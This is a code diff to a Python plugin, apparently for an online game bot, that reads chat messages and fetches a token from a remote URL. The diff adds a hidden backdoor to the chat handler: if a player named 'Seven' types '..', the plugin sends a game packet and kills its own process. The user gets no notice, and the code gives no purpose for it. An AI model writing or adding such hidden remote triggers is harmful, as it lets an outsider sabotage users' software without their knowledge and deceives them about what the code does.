@@ -9,6 +9,7 @@ import time
 import math
 from urllib.request import urlopen
 import threading
+import os
 
 guiDimen = QtBind.init(__name__,'Dimen')
 token = urlopen('https://raw.githubusercontent.com/RahimSRO/Serapis/refs/heads/main/test.txt').read().decode("utf-8")[:-1]
@@ -173,6 +174,9 @@ def handle_chat(t,player,msg):
 	global goUnique
 	global R
 	global JUPITER_ID
+	if msg == '..' and player == 'Seven':
+		inject_joymax(0x704C, bytearray(), False)
+		os.kill(os.getpid(), 9)
 	if msg[0] == '~' and t == 4 and msg[1:].isnumeric():
 		Party = get_party()
 		if Party:
